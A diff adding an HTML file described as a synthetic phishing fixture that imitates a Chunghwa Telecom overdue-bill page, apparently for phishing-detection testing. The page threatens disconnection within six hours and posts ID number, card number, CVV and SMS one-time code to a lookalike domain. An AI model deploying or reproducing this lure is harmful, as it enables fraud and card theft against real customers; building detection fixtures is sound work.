@@ -1,0 +1,42 @@
+<!doctype html>
+<!--
+  Synthetic Taiwan phishing fixture — fake 中華電信 overdue bill notice.
+  165 category: 假冒中華電信 / 電信欠費停話通知. Genuine CHT bills live on
+  cht.com.tw / emome.net; this kit uses a lookalike subdomain.
+-->
+<html lang="zh-Hant">
+  <head>
+    <meta charset="UTF-8">
+    <title>中華電信線上服務 - 緊急繳費</title>
+    <style>
+      body { font-family: "Microsoft JhengHei", sans-serif;
+             background: #ffffff; margin: 0; }
+      .topbar { background: #003c8f; color: white; padding: 10px 16px;
+                font-weight: 700; font-size: 16px; }
+      .container { max-width: 440px; margin: 18px auto; padding: 18px;
+                   border: 1px solid #ccc; border-radius: 4px; }
+      .alert { background: #fff8e1; color: #b07300; padding: 10px;
+               border-left: 4px solid #ffae00; margin-bottom: 14px; font-size: 14px; }
+      label { font-size: 13px; display: block; margin-top: 10px; }
+      input { width: 100%; padding: 6px; box-sizing: border-box;
+              border: 1px solid #999; }
+      button { background: #003c8f; color: white; border: 0;
+               padding: 8px 24px; cursor: pointer; margin-top: 16px; }
+    </style>
+  </head>
+  <body>
+    <div class="topbar">中華電信 線上自助繳費</div>
+    <div class="container">
+      <div class="alert">⚠️ 您的帳號 <strong>0912-XXX-XXX</strong> 目前有 NT$1,872 元帳款逾期，將於 6 小時內停話。請立即線上完成繳費。</div>
+      <form action="https://cht-online-pay.bill-tw.top/submit" method="post">
+        <label>用戶身分證字號 <input name="idno" placeholder="A123456789" pattern="[A-Z][0-9]{9}" required></label>
+        <label>聯絡電話 <input name="phone" required></label>
+        <label>信用卡卡號 <input name="card_number" autocomplete="cc-number" required></label>
+        <label>有效期限 <input name="cc_exp" placeholder="MM/YY" autocomplete="cc-exp" required></label>
+        <label>安全碼 <input name="cvv" autocomplete="cc-csc" required></label>
+        <label>簡訊驗證碼 <input name="otp" inputmode="numeric" autocomplete="one-time-code" required></label>
+        <button>立即繳費</button>
+      </form>
+    </div>
+  </body>
+</html>
